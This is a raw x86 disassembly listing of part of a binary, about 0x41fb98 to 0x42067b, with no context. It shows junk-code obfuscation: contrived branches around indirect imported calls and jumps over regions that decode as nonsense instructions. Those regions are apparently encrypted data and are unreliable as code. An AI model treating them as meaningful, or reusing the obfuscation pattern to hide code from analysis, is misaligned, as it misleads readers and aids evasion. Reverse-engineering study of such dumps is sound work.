  41fb98:	or     DWORD PTR ds:0x428297,0x42829b
  41fba2:	xor    edx,edx
  41fba4:	xor    DWORD PTR ds:0x4283ab,0x428313
  41fbae:	div    ecx
  41fbb0:	imul   eax,eax,0x4312
  41fbb6:	add    eax,0x5abe
  41fbbb:	cmp    DWORD PTR ds:0x42837f,0x0
  41fbc2:	mov    DWORD PTR ds:0x4281ab,ebx
  41fbc8:	mov    DWORD PTR ds:0x4283b7,0x6142
  41fbd2:	jmp    0x41fc37
  41fbd7:	mov    DWORD PTR ds:0x428287,0x13f4
  41fbe1:	mov    DWORD PTR ds:0x428187,0x47aa
  41fbeb:	cmp    DWORD PTR ds:0x42837f,0x0
  41fbf2:	jne    0x41fc15
  41fbf8:	push   0x4280ef
  41fbfd:	call   DWORD PTR ds:0x428e50
  41fc03:	and    ecx,DWORD PTR ds:0x428273
  41fc09:	adc    DWORD PTR ds:0x428303,ecx
  41fc0f:	sub    DWORD PTR ds:0x42830b,edi
  41fc15:	mov    ecx,DWORD PTR ds:0x42837b
  41fc1b:	sbb    ecx,DWORD PTR ds:0x42823b
  41fc21:	mov    DWORD PTR ds:0x42837b,ecx
  41fc27:	and    DWORD PTR ds:0x428323,0x55d2
  41fc31:	add    DWORD PTR ds:0x42819f,ecx
  41fc37:	mov    ecx,DWORD PTR [ebp-0x84]
  41fc3d:	adc    DWORD PTR ds:0x42828f,0x1028
  41fc47:	xor    eax,ecx
  41fc49:	or     ecx,DWORD PTR ds:0x42829f
  41fc4f:	xor    edx,edx
  41fc51:	or     ecx,DWORD PTR ds:0x42816b
  41fc57:	mov    ecx,0x5ae
  41fc5c:	sub    DWORD PTR ds:0x428287,0x4356
  41fc66:	div    ecx
  41fc68:	cmp    DWORD PTR ds:0x42823f,0x0
  41fc6f:	mov    ecx,0x1d02
  41fc74:	mov    DWORD PTR ds:0x4282a3,ebx
  41fc7a:	mov    DWORD PTR ds:0x4282b7,0x2746
  41fc84:	mov    DWORD PTR ds:0x428287,edx
  41fc8a:	jmp    0x41fcee
  41fc8f:	mov    DWORD PTR ds:0x42817b,0x6e43
  41fc99:	cmp    DWORD PTR ds:0x42823f,0x0
  41fca0:	jbe    0x41fccb
  41fca6:	push   0x29e8
  41fcab:	push   0x54b0
  41fcb0:	push   DWORD PTR [ebp-0x28]
  41fcb3:	call   DWORD PTR ds:0x428ec4
  41fcb9:	neg    ecx
  41fcbb:	sbb    ecx,DWORD PTR ds:0x4283b3
  41fcc1:	and    DWORD PTR ds:0x42817b,0x42832f
  41fccb:	mov    ecx,DWORD PTR ds:0x428183
  41fcd1:	xor    DWORD PTR ds:0x42824f,ecx
  41fcd7:	movzx  ecx,BYTE PTR ds:0x428297
  41fcde:	sub    DWORD PTR ds:0x4283a3,ecx
  41fce4:	mov    DWORD PTR ds:0x428253,0x7a81
  41fcee:	xor    eax,0x5e8c
  41fcf3:	adc    ecx,0x10d9
  41fcf9:	mov    DWORD PTR [ebp-0x48],eax
  41fcfc:	mov    DWORD PTR [ebp-0x13c],0x7b18
  41fd06:	mov    eax,ds:0x4283b7
  41fd0b:	add    eax,DWORD PTR ds:0x42817f
  41fd11:	mov    ds:0x4283b7,eax
  41fd16:	mov    DWORD PTR [ebp-0x138],0x1169
  41fd20:	xor    ecx,ecx
  41fd22:	mov    DWORD PTR [ebp-0x12c],0x1379
  41fd2c:	cmp    DWORD PTR ds:0x428323,0x0
  41fd33:	mov    ecx,DWORD PTR ds:0x42830b
  41fd39:	mov    ecx,DWORD PTR ds:0x42839b
  41fd3f:	mov    ecx,0x2973
  41fd44:	movzx  ecx,WORD PTR ds:0x42823b
  41fd4b:	jmp    0x41fd9c
  41fd50:	mov    eax,0x21a8
  41fd55:	mov    eax,0x38ee
  41fd5a:	cmp    DWORD PTR ds:0x428323,0x0
  41fd61:	ja     0x41fd84
  41fd67:	push   DWORD PTR [ebp-0x20]
  41fd6a:	call   DWORD PTR ds:0x428e54
  41fd70:	and    ecx,ecx
  41fd72:	xor    DWORD PTR ds:0x428283,0x6e97
  41fd7c:	add    ecx,ecx
  41fd7e:	or     DWORD PTR ds:0x42825f,edx
  41fd84:	mov    ecx,DWORD PTR ds:0x4282c3
  41fd8a:	mov    ecx,DWORD PTR [ecx]
  41fd8c:	sbb    DWORD PTR ds:0x4282af,ecx
  41fd92:	sbb    DWORD PTR ds:0x4283a3,0x42832b
  41fd9c:	mov    eax,DWORD PTR [ebp-0x12c]
  41fda2:	mov    ecx,0x5856
  41fda7:	sub    ecx,eax
  41fda9:	shr    ecx,0x2
  41fdac:	sub    ecx,0x5be6
  41fdb2:	xor    eax,0xe7a
  41fdb7:	mov    eax,DWORD PTR [ebp-0x138]
  41fdbd:	imul   ecx,eax
  41fdc0:	mov    eax,DWORD PTR [ebp-0x13c]
  41fdc6:	sbb    DWORD PTR ds:0x42831f,0x428323
  41fdd0:	and    ecx,eax
  41fdd2:	xor    DWORD PTR ds:0x42818f,edx
  41fdd8:	mov    eax,0x3b18
  41fddd:	sub    eax,ecx
  41fddf:	mov    DWORD PTR [ebp-0xfc],eax
  41fde5:	mov    DWORD PTR [ebp-0x28],0x16d7
  41fdec:	mov    DWORD PTR [ebp-0x134],0x6b4
  41fdf6:	sub    eax,DWORD PTR ds:0x42837f
  41fdfc:	mov    eax,DWORD PTR [ebp-0x134]
  41fe02:	xor    ecx,0x2b1a
  41fe08:	or     eax,0x4f70
  41fe0d:	xor    ecx,ecx
  41fe0f:	add    ecx,DWORD PTR ds:0x42837f
  41fe15:	xor    DWORD PTR ds:0x428387,ecx
  41fe1b:	mov    ecx,DWORD PTR [ebp-0x28]
  41fe1e:	or     eax,ecx
  41fe20:	sub    eax,0x5ff7
  41fe25:	mov    DWORD PTR [ebp-0xc8],eax
  41fe2b:	adc    eax,ecx
  41fe2d:	mov    DWORD PTR [ebp-0xe4],0x5f39
  41fe37:	sub    ecx,ecx
  41fe39:	mov    DWORD PTR [ebp-0xc4],0x6236
  41fe43:	mov    DWORD PTR [ebp-0x7c],0x6ce7
  41fe4a:	cmp    DWORD PTR ds:0x42817f,0x0
  41fe51:	not    DWORD PTR ds:0x4282ab
  41fe57:	mov    DWORD PTR ds:0x428247,edx
  41fe5d:	jmp    0x41feb6
  41fe62:	mov    eax,0x4320
  41fe67:	cmp    DWORD PTR ds:0x42817f,0x0
  41fe6e:	jne    0x41fe8d
  41fe74:	push   DWORD PTR [ebp-0x28]
  41fe77:	call   DWORD PTR ds:0x428e58
  41fe7d:	and    DWORD PTR ds:0x428397,0x4195
  41fe87:	add    ecx,DWORD PTR ds:0x42824f
  41fe8d:	movzx  ecx,WORD PTR ds:0x428327
  41fe94:	and    DWORD PTR ds:0x428303,ecx
  41fe9a:	and    DWORD PTR ds:0x428277,edx
  41fea0:	add    ecx,0x2485
  41fea6:	mov    eax,ds:0x4281bb
  41feab:	mov    ecx,DWORD PTR ds:0x4283ef
  41feb1:	sub    ecx,eax
  41feb3:	and    eax,DWORD PTR [eax+ecx*1]
  41feb6:	mov    DWORD PTR [ebp-0x128],0x7537
  41fec0:	not    ecx
  41fec2:	mov    DWORD PTR [ebp-0x114],0x6985
  41fecc:	movzx  ecx,BYTE PTR ds:0x42819f
  41fed3:	or     DWORD PTR ds:0x4283b3,ecx
  41fed9:	mov    DWORD PTR [ebp-0x14],0x5627
  41fee0:	cmp    DWORD PTR ds:0x42827b,0x0
  41fee7:	mov    ecx,0x306f
  41feec:	mov    DWORD PTR ds:0x42837f,0x1b86
  41fef6:	jmp    0x41ff30
  41fefb:	mov    eax,0x6a49
  41ff00:	mov    DWORD PTR ds:0x4282fb,ecx
  41ff06:	cmp    DWORD PTR ds:0x42827b,0x0
  41ff0d:	jae    0x41ff28
  41ff13:	push   0x428163
  41ff18:	call   DWORD PTR ds:0x428ec8
  41ff1e:	or     ecx,DWORD PTR ds:0x428183
  41ff24:	and    ecx,ecx
  41ff26:	adc    ecx,ecx
  41ff28:	adc    DWORD PTR ds:0x428327,ecx
  41ff2e:	sbb    ecx,ecx
  41ff30:	mov    DWORD PTR [ebp-0x64],0x72e7
  41ff37:	mov    eax,DWORD PTR [ebp-0x14]
  41ff3a:	and    DWORD PTR ds:0x42824b,edi
  41ff40:	add    eax,DWORD PTR [ebp-0x64]
  41ff43:	jmp    0x42029f
  41ff48:	test   DWORD PTR [edx],edi
  41ff4a:	cmp    BYTE PTR [eax+0x2e],ah
  41ff4d:	pop    edx
  41ff4e:	cmp    eax,0x6ff09f1a
  41ff53:	mov    al,0xfe
  41ff55:	jmp    0x41ffbe
  41ff57:	mov    esp,0x18162323
  41ff5c:	mov    ds:0xe8181812,eax
  41ff61:	xchg   esp,eax
  41ff62:	push   ebp
  41ff63:	fistp  QWORD PTR [esi-0x53]
  41ff66:	cs push edi
  41ff68:	cmp    al,BYTE PTR [ebx]
  41ff6a:	in     eax,0x14
  41ff6c:	jno    0x41ffea
  41ff6e:	test   al,0x7f
  41ff70:	sub    al,0x73
  41ff72:	call   0x74dea5f7
  41ff77:	je     0x41ffbb
  41ff79:	jne    0x41ff4e
  41ff7b:	dec    ebp
  41ff7c:	mov    ds:0xb93154cd,al
  41ff81:	adc    bh,BYTE PTR fs:[esi]
  41ff84:	int    0xd0
  41ff86:	sbb    eax,0x8775029c
  41ff8b:	mov    ah,0xd2
  41ff8d:	jo     0x41ffc8
  41ff8f:	jnp    0x41ffc3
  41ff91:	into   
  41ff92:	and    BYTE PTR [ebp-0x36aaf3db],dl
  41ff98:	inc    edx
  41ff99:	cdq    
  41ff9a:	stc    
  41ff9b:	adc    DWORD PTR [eax],edi
  41ff9d:	sub    DWORD PTR [esi+ecx*2],edi
  41ffa0:	xor    eax,eax
  41ffa2:	jl     0x41ff7f
  41ffa4:	mov    bh,0x7b
  41ffa6:	loop   0x41ff88
  41ffa8:	loop   0x41ff96
  41ffaa:	sahf   
  41ffab:	fs lock fs out dx,eax
  41ffaf:	pop    ss
  41ffb0:	or     ch,bh
  41ffb2:	sar    BYTE PTR [eax-0x5c],cl
  41ffb5:	daa    
  41ffb6:	mov    dl,0x29
  41ffb8:	loope  0x42002f
  41ffba:	mov    esi,0x37898f63
  41ffbf:	xchg   edx,eax
  41ffc0:	stc    
  41ffc1:	mov    cl,0xaa
  41ffc3:	in     eax,dx
  41ffc4:	mov    fs,WORD PTR [edx+0x67b1bc5a]
  41ffca:	dec    ebx
  41ffcb:	aas    
  41ffcc:	mov    edx,0x6fe0841f
  41ffd1:	xor    bh,BYTE PTR [edx]
  41ffd3:	call   0x410343b4
  41ffd8:	je     0x41ff6a
  41ffda:	cld    
  41ffdb:	dec    ecx
  41ffdc:	mov    ecx,DWORD PTR [edi+0x76]
  41ffdf:	push   0x53
  41ffe1:	adc    BYTE PTR es:[ecx-0x78],bl
  41ffe5:	sub    al,0x49
  41ffe7:	jl     0x41ffeb
  41ffe9:	mov    al,ds:0xd3253882
  41ffee:	cmp    DWORD PTR [ecx-0x2410b956],ecx
  41fff4:	push   eax
  41fff5:	mov    ch,0x62
  41fff7:	inc    BYTE PTR [ebx+0x102f67c1]
  41fffd:	xor    dl,cl
  41ffff:	jbe    0x41ffa3
  420001:	leave  
  420002:	push   0x5e
  420004:	iret   
  420005:	pop    edi
  420006:	shr    BYTE PTR [eax],0x92
  420009:	ss into 
  42000b:	mov    ecx,DWORD PTR [ecx]
  42000d:	add    BYTE PTR [edx],0x76
  420010:	inc    esp
  420011:	pop    ds
  420012:	jmp    0x42003f
  420014:	inc    esi
  420015:	(bad)  
  420016:	pusha  
  420017:	ffreep st(4)
  420019:	loope  0x420017
  42001b:	and    al,0x6f
  42001d:	icebp  
  42001e:	enter  0x23d3,0x3c
  420022:	cli    
  420023:	arpl   WORD PTR [eax+0x7b8d45d9],sp
  420029:	retf   
  42002a:	sub    ah,BYTE PTR [edx]
  42002c:	or     BYTE PTR [edx],bh
  42002e:	mov    ebp,0x97750927
  420033:	push   0xe50d2de1
  420038:	int3   
  420039:	loopne 0x4200b7
  42003b:	pop    es
  42003c:	xlat   BYTE PTR ds:[ebx]
  42003d:	out    0xc1,al
  42003f:	pop    edx
  420040:	add    BYTE PTR [esi],ch
  420042:	dec    ebp
  420043:	pop    es
  420044:	aas    
  420045:	pop    edx
  420046:	leave  
  420047:	out    0x29,al
  420049:	pop    eax
  42004a:	or     BYTE PTR [edi-0x7f],0xa8
  42004e:	pushf  
  42004f:	dec    ebx
  420050:	fnstcw WORD PTR [edi]
  420052:	jmp    0x420065
  420054:	fistp  DWORD PTR [edi]
  420056:	mov    di,WORD PTR [ebp+0x3b]
  42005a:	rcr    eax,1
  42005c:	inc    ecx
  42005d:	dec    esi
  42005e:	mov    dl,0x62
  420060:	in     eax,dx
  420061:	dec    eax
  420062:	clc    
  420063:	repz add DWORD PTR [ecx-0x16c981ec],0xffffffad
  42006b:	mov    esi,esp
  42006d:	sub    DWORD PTR [ebp-0x75],ecx
  420070:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420071:	ins    DWORD PTR es:[edi],dx
  420072:	adc    BYTE PTR [ecx-0x273b5ac1],bh
  420078:	lea    esp,[edx]
  42007a:	mov    cl,0x90
  42007c:	popa   
  42007d:	pop    ss
  42007e:	loop   0x4200d9
  420080:	fwait
  420081:	loopne 0x4200bd
  420083:	jmp    0x9d90:0x1b280b7b
  42008a:	cmp    al,0x6e
  42008c:	in     al,dx
  42008d:	sub    BYTE PTR [eax],0x7b
  420090:	imul   esi,esi,0xd
  420093:	xor    BYTE PTR [edx-0x48fd1076],0x2
  42009a:	scas   eax,DWORD PTR es:[edi]
  42009b:	leave  
  42009c:	mov    ebx,edx
  42009e:	dec    eax
  42009f:	mov    eax,ds:0x89a68ed8
  4200a4:	mov    bh,0x8
  4200a6:	stos   DWORD PTR es:[edi],eax
  4200a7:	mov    dl,0x16
  4200a9:	shr    BYTE PTR [eax+0x73],1
  4200ac:	and    dh,cl
  4200ae:	je     0x4200f9
  4200b0:	xlat   BYTE PTR ds:[ebx]
  4200b1:	nop
  4200b2:	xchg   BYTE PTR [edx],cl
  4200b4:	and    DWORD PTR [edi-0x72],esp
  4200b7:	imul   edi,DWORD PTR [esi],0xffffff9f
  4200ba:	mov    al,ds:0x7d617b76
  4200bf:	mov    al,0x97
  4200c1:	xchg   ebp,eax
  4200c2:	popa   
  4200c3:	mov    al,0x3c
  4200c5:	mov    ecx,0x83a59bf1
  4200ca:	adc    al,0x6f
  4200cc:	or     al,0xdf
  4200ce:	cmp    ecx,edx
  4200d0:	or     BYTE PTR [ebx-0xb054e22],bh
  4200d6:	pop    ss
  4200d7:	mov    cl,0x34
  4200d9:	test   ebp,esp
  4200db:	adc    cl,BYTE PTR [ecx-0x40a5dffb]
  4200e1:	ds mov dl,ah
  4200e4:	jnp    0x420106
  4200e6:	fsubp  st(7),st
  4200e8:	repz ret 
  4200ea:	cmp    DWORD PTR [edx+0x78b2fdb4],0x8179d800
  4200f4:	lds    ecx,FWORD PTR [edi+0x70426814]
  4200fa:	jb     0x4200f3
  4200fc:	lock add esp,DWORD PTR [ecx-0x7ebb303d]
  420103:	aad    0x57
  420105:	dec    ebx
  420106:	xlat   BYTE PTR ds:[ebx]
  420107:	dec    ebx
  420108:	sbb    eax,0x3726ee99
  42010d:	addr16 pop ss
  42010f:	mov    bh,BYTE PTR [eax-0x5c861779]
  420115:	push   ebp
  420116:	iret   
  420117:	fld    st(6)
  420119:	fidivr WORD PTR [ebx]
  42011b:	inc    edi
  42011c:	aas    
  42011d:	xchg   esp,eax
  42011e:	mov    ch,0xd9
  420120:	icebp  
  420121:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420122:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420123:	mov    bh,0x3a
  420125:	add    BYTE PTR [edi-0x7e],ch
  420128:	sub    al,0xf8
  42012a:	jg     0x42015f
  42012c:	clc    
  42012d:	fsub   DWORD PTR [eax+esi*1]
  420130:	mov    bl,0xfa
  420132:	test   BYTE PTR [edx],bh
  420134:	scas   eax,DWORD PTR es:[edi]
  420135:	sbb    eax,esp
  420137:	push   ebp
  420138:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420139:	or     BYTE PTR [eax+0x6ff9218e],bl
  42013f:	push   ecx
  420140:	or     al,0x30
  420142:	mov    bl,0xc1
  420144:	in     eax,0x60
  420146:	inc    esi
  420147:	jnp    0x420174
  420149:	test   eax,0xe6c408cb
  42014e:	mov    al,ds:0x5cc05d22
  420153:	push   edx
  420154:	mov    ?,WORD PTR [esi-0x7]
  420157:	adc    esp,DWORD PTR [ebx+0x6a]
  42015a:	sub    DWORD PTR [eax-0x459e787a],ebx
  420160:	pop    ebp
  420161:	dec    edx
  420162:	xchg   ebp,eax
  420163:	push   ds
  420164:	adc    al,BYTE PTR [eax]
  420166:	xchg   esi,eax
  420167:	shl    BYTE PTR [esp+esi*2],0x6c
  42016b:	cmp    dh,BYTE PTR [edi+0x52]
  42016e:	ins    DWORD PTR es:[edi],dx
  42016f:	cli    
  420170:	(bad)  
  420171:	out    dx,eax
  420172:	ror    cl,cl
  420174:	into   
  420175:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420176:	imul   edx,DWORD PTR [esi+0x5eaad555],0x74d5f8f8
  420180:	addr16 js 0x42010b
  420183:	nop
  420184:	jmp    0x96912667
  420189:	push   ebx
  42018a:	sub    BYTE PTR [ebp-0x2a46ba8c],0xd3
  420191:	repnz repnz pushf 
  420194:	adc    edx,DWORD PTR [edi+0x75]
  420197:	repz out dx,al
  420199:	fsubr  QWORD PTR [edx-0x3b26c7ce]
  42019f:	dec    esp
  4201a0:	or     dl,BYTE PTR [edx+esi*4-0x88e4efa]
  4201a7:	cmp    al,0x96
  4201a9:	xlat   BYTE PTR ds:[ebx]
  4201aa:	aad    0x5a
  4201ac:	xor    BYTE PTR [esi+0xff86bb3],bl
  4201b2:	sub    dh,BYTE PTR [edx-0x29488656]
  4201b8:	in     al,dx
  4201b9:	xchg   ebp,eax
  4201bb:	popa   
  4201bc:	mov    ebp,0xa08155f0
  4201c1:	mov    ds:0xb4ffc3ff,eax
  4201c6:	stos   BYTE PTR es:[edi],al
  4201c7:	pushf  
  4201c8:	lea    esi,[esp+ebx*4-0x18fdb3bb]
  4201cf:	(bad)  
  4201d0:	mov    edx,0xfc419d8b
  4201d5:	fiadd  DWORD PTR [ecx-0x39194f9f]
  4201db:	xlat   BYTE PTR ds:[ebx]
  4201dc:	inc    ebx
  4201dd:	repz (bad) 
  4201e0:	or     cl,dh
  4201e2:	fimul  DWORD PTR [eax]
  4201e4:	jp     0x4201f0
  4201e6:	fsubr  QWORD PTR [eax+0x6f]
  4201e9:	inc    eax
  4201ea:	dec    ebx
  4201eb:	jle    0x42024b
  4201ed:	and    cl,BYTE PTR [edi]
  4201ef:	gs fwait
  4201f1:	mov    cl,0xf9
  4201f3:	(bad)  
  4201f4:	mov    bl,0x48
  4201f6:	cld    
  4201f7:	fidivr DWORD PTR [esp]
  4201fa:	mov    WORD PTR [ecx],fs
  4201fc:	sbb    bh,ah
  4201fe:	xchg   BYTE PTR [esp+edx*2+0x219dd21b],dl
  420205:	pop    ebp
  420206:	ret    
  420207:	dec    edx
  420208:	out    0x6c,eax
  42020a:	rcl    BYTE PTR [edi-0x1e040523],cl
  420210:	or     dl,dl
  420212:	mov    eax,0x21bbc74a
  420217:	adc    DWORD PTR [eax],edx
  420219:	cwde   
  42021a:	mov    edx,0x6b7bd41d
  42021f:	xchg   edi,eax
  420220:	aad    0x1d
  420222:	(bad)  
  420223:	popa   
  420224:	pop    ss
  420225:	pop    ecx
  420226:	cmp    al,0xb7
  420228:	pop    ecx
  420229:	mov    eax,ds:0x1f257313
  42022e:	push   cs
  42022f:	into   
  420230:	xchg   ebp,eax
  420231:	mov    edx,0xd334eda0
  420236:	scas   al,BYTE PTR es:[edi]
  420237:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420238:	pop    eax
  420239:	int    0xf3
  42023b:	push   cs
  42023c:	dec    ebp
  42023d:	(bad)  
  42023f:	jmp    0x25e4e002
  420244:	enter  0x53b4,0xf2
  420248:	add    DWORD PTR [edx],esp
  42024a:	or     al,0x26
  42024c:	pop    ecx
  42024d:	or     ah,BYTE PTR [eax+0x61ab86a5]
  420253:	sbb    DWORD PTR [ebx-0xf3da7f3],esi
  420259:	sahf   
  42025a:	int    0xbf
  42025c:	ja     0x42020c
  42025e:	dec    esi
  42025f:	lea    eax,[eax-0x39929080]
  420265:	cwde   
  420266:	ins    BYTE PTR es:[edi],dx
  420267:	sub    al,0x64
  420269:	sbb    DWORD PTR [edi+0x60482361],0x1f815ac6
  420273:	shl    ecx,0x1
  420276:	adc    eax,0x4fb9b104
  42027b:	test   al,0x74
  42027d:	and    al,0xa9
  42027f:	ret    0x52e9
  420282:	and    BYTE PTR [eax+0x6d],bh
  420285:	mov    eax,ds:0xb97f7e53
  42028a:	ins    DWORD PTR es:[edi],dx
  42028b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42028c:	cmp    ecx,DWORD PTR [ebp+0x1178be72]
  420292:	shl    ah,cl
  420294:	pop    esi
  420295:	sub    DWORD PTR [ebx-0x3],0x29
  420299:	ja     0x420238
  42029b:	pushf  
  42029c:	sub    DWORD PTR [ebx],edx
  42029e:	ror    BYTE PTR [ebx-0x11373],1
  4202a4:	inc    DWORD PTR [ecx+0x42829f0d]
  4202aa:	add    BYTE PTR [ebx],bl
  4202ac:	add    DWORD PTR [edx+0x0],0x2b
  4202b0:	ror    DWORD PTR [ebx+0x4283970d],0x0
  4202b7:	add    DWORD PTR ds:0x42831f,ecx
  4202bd:	mov    ecx,DWORD PTR [ebp-0x128]
  4202c3:	imul   eax,ecx
  4202c6:	imul   eax,eax,0xe4e
  4202cc:	mov    ecx,DWORD PTR [ebp-0x7c]
  4202cf:	or     eax,ecx
  4202d1:	and    DWORD PTR ds:0x42839b,ebx
  4202d7:	mov    ecx,DWORD PTR [ebp+0x8]
  4202da:	sub    DWORD PTR ds:0x428177,0x428297
  4202e4:	lea    eax,[ecx+eax*1+0x46210209]
  4202eb:	add    DWORD PTR ds:0x42838b,0x42816f
  4202f5:	push   eax
  4202f6:	add    DWORD PTR ds:0x428283,0x42823b
  420300:	call   0x414116
  420305:	cmp    DWORD PTR ds:0x42831b,0x0
  42030c:	mov    DWORD PTR ds:0x428273,edx
  420312:	mov    esi,DWORD PTR ds:0x42823b
  420318:	mov    DWORD PTR ds:0x428317,ebx
  42031e:	mov    DWORD PTR ds:0x428327,0x5564
  420328:	jmp    0x420388
  42032d:	mov    DWORD PTR ds:0x428193,0x3019
  420337:	not    DWORD PTR ds:0x42831b
  42033d:	cmp    DWORD PTR ds:0x42831b,0x0
  420344:	jae    0x42036f
  42034a:	push   DWORD PTR [ebp-0x24]
  42034d:	push   0x42837b
  420352:	push   DWORD PTR [ebp-0x1c]
  420355:	push   DWORD PTR [ebp-0xc]
  420358:	push   0x6e6a
  42035d:	call   DWORD PTR ds:0x428ecc
  420363:	adc    ecx,DWORD PTR ds:0x428253
  420369:	xor    DWORD PTR ds:0x42830f,edx
  42036f:	add    ecx,esi
  420371:	mov    ecx,DWORD PTR ds:0x42822b
  420377:	mov    esi,DWORD PTR ds:0x4282e3
  42037d:	sub    esi,ecx
  42037f:	and    ecx,DWORD PTR [ecx+esi*1]
  420382:	sbb    DWORD PTR ds:0x428197,ecx
  420388:	mov    ecx,eax
  42038a:	mov    eax,DWORD PTR [ebp-0xc4]
  420390:	add    esi,0x7195
  420396:	imul   eax,eax,0x21b3
  42039c:	sbb    DWORD PTR ds:0x42830b,ebx
  4203a2:	add    eax,DWORD PTR [ebp-0xe4]
  4203a8:	and    eax,0xd5c
  4203ad:	cmp    DWORD PTR ds:0x428387,0x0
  4203b4:	mov    DWORD PTR ds:0x4282af,ebx
  4203ba:	mov    esi,0x156a
  4203bf:	movzx  esi,WORD PTR ds:0x4281ab
  4203c6:	jmp    0x420422
  4203cb:	mov    DWORD PTR ds:0x42826f,0x2dc
  4203d5:	mov    DWORD PTR ds:0x42826b,edi
  4203db:	cmp    DWORD PTR ds:0x428387,0x0
  4203e2:	jae    0x420410
  4203e8:	push   0x427fff
  4203ed:	call   DWORD PTR ds:0x428ed0
  4203f3:	movzx  esi,WORD PTR ds:0x428187
  4203fa:	add    DWORD PTR ds:0x428307,esi
  420400:	adc    DWORD PTR ds:0x4281a7,ebx
  420406:	add    DWORD PTR ds:0x428383,0x22a2
  420410:	and    esi,DWORD PTR ds:0x428383
  420416:	or     DWORD PTR ds:0x42837f,ecx
  42041c:	sbb    esi,DWORD PTR ds:0x428303
  420422:	sub    eax,0x2e81
  420427:	cmp    DWORD PTR ds:0x428283,0x0
  42042e:	mov    DWORD PTR ds:0x428383,0x5615
  420438:	mov    DWORD PTR ds:0x42817b,0x419b
  420442:	mov    DWORD PTR ds:0x42819f,0x389d
  42044c:	not    DWORD PTR ds:0x428273
  420452:	jmp    0x4204b6
  420457:	mov    esi,0x7b57
  42045c:	cmp    DWORD PTR ds:0x428283,0x0
  420463:	je     0x4204a0
  420469:	push   0x42824f
  42046e:	push   DWORD PTR [ebp-0x24]
  420471:	call   DWORD PTR ds:0x428ed4
  420477:	sub    DWORD PTR ds:0x428307,0x6950
  420481:	movzx  esi,WORD PTR ds:0x42827b
  420488:	xor    esi,DWORD PTR ds:0x42832b
  42048e:	mov    DWORD PTR ds:0x42827b,esi
  420494:	mov    esi,DWORD PTR ds:0x428263
  42049a:	or     DWORD PTR ds:0x4282ff,esi
  4204a0:	xor    DWORD PTR ds:0x42832f,ecx
  4204a6:	add    DWORD PTR ds:0x42832f,ebx
  4204ac:	or     DWORD PTR ds:0x428387,0x793c
  4204b6:	xor    edx,edx
  4204b8:	add    DWORD PTR ds:0x42819b,0xc98
  4204c2:	mov    esi,0x2f1dc
  4204c7:	div    esi
  4204c9:	xor    edx,edx
  4204cb:	xor    eax,0x56ef
  4204d0:	add    ecx,eax
  4204d2:	adc    DWORD PTR ds:0x42817f,ebx
  4204d8:	mov    DWORD PTR [ebp-0x90],ecx
  4204de:	sbb    DWORD PTR ds:0x4283b7,0x2859
  4204e8:	mov    DWORD PTR [ebp-0xe0],0x7a31
  4204f2:	mov    DWORD PTR [ebp-0x44],0x2514
  4204f9:	cmp    DWORD PTR ds:0x42819b,0x0
  420500:	mov    DWORD PTR ds:0x428303,0x6f69
  42050a:	mov    edx,0x2839
  42050f:	jmp    0x42057e
  420514:	movzx  ecx,WORD PTR ds:0x42829f
  42051b:	cmp    DWORD PTR ds:0x42819b,0x0
  420522:	jne    0x420555
  420528:	push   0x1336
  42052d:	push   DWORD PTR [ebp-0xc]
  420530:	push   0x75c6
  420535:	push   0x3ce6
  42053a:	push   DWORD PTR [ebp-0x1c]
  42053d:	call   DWORD PTR ds:0x428ed8
  420543:	mov    esi,DWORD PTR ds:0x42818b
  420549:	sbb    DWORD PTR ds:0x4281a7,esi
  42054f:	and    DWORD PTR ds:0x4282a3,edx
  420555:	sbb    DWORD PTR ds:0x428257,edx
  42055b:	mov    esi,DWORD PTR ds:0x42838f
  420561:	or     DWORD PTR ds:0x428393,esi
  420567:	mov    esi,DWORD PTR ds:0x4281b7
  42056d:	mov    edx,DWORD PTR ds:0x42834f
  420573:	sub    esi,edx
  420575:	and    esi,DWORD PTR [esi+edx*1]
  420578:	adc    DWORD PTR ds:0x42838f,edx
  42057e:	mov    DWORD PTR [ebp-0xdc],0x699c
  420588:	mov    DWORD PTR [ebp-0xd8],0x1
  420592:	adc    esi,eax
  420594:	mov    DWORD PTR [ebp-0x24],0x7901
  42059b:	cmp    DWORD PTR ds:0x428183,0x0
  4205a2:	not    esi
  4205a4:	mov    DWORD PTR ds:0x4283a7,0x3e17
  4205ae:	jmp    0x420635
  4205b3:	mov    DWORD PTR ds:0x428243,0x2222
  4205bd:	not    DWORD PTR ds:0x428253
  4205c3:	cmp    DWORD PTR ds:0x428183,0x0
  4205ca:	jge    0x42060e
  4205d0:	push   0x185b
  4205d5:	push   0x4283af
  4205da:	push   0x89e7
  4205df:	push   DWORD PTR [ebp-0x20]
  4205e2:	call   DWORD PTR ds:0x428e5c
  4205e8:	xor    edx,DWORD PTR ds:0x428257
  4205ee:	mov    ecx,DWORD PTR ds:0x42823f
  4205f4:	or     DWORD PTR ds:0x42816f,ecx
  4205fa:	mov    ecx,DWORD PTR ds:0x4282e3
  420600:	mov    ecx,DWORD PTR [ecx]
  420602:	and    DWORD PTR ds:0x4283ab,ecx
  420608:	and    esi,0x3af9
  42060e:	and    ecx,0x78a0
  420614:	mov    edx,DWORD PTR ds:0x42828b
  42061a:	xor    DWORD PTR ds:0x428277,edx
  420620:	movzx  ecx,WORD PTR ds:0x428263
  420627:	and    ecx,DWORD PTR ds:0x42839b
  42062d:	mov    DWORD PTR ds:0x428263,ecx
  420633:	sub    ecx,edx
  420635:	mov    DWORD PTR [ebp-0xc0],0x3e2c
  42063f:	xor    DWORD PTR ds:0x4283af,0x275e
  420649:	mov    DWORD PTR [ebp-0x78],0x37f2
  420650:	sbb    ecx,0x6514
  420656:	mov    DWORD PTR [ebp-0x10],0x62ba
  42065d:	jmp    0x4209b9
  420662:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420663:	(bad)  
  420664:	mov    ?,ebx
  420666:	push   0x3a
  420668:	and    eax,0xe3891e9e
  42066d:	stos   BYTE PTR es:[edi],al
  42066e:	jne    0x4206d7
  420670:	adc    al,0xaa
  420672:	lods   al,BYTE PTR ds:[esi]
  420673:	sbb    eax,0x12a31816
  420678:	sbb    BYTE PTR [eax],bl
  42067a:	push   eax
  42067b:	and    bh,dl
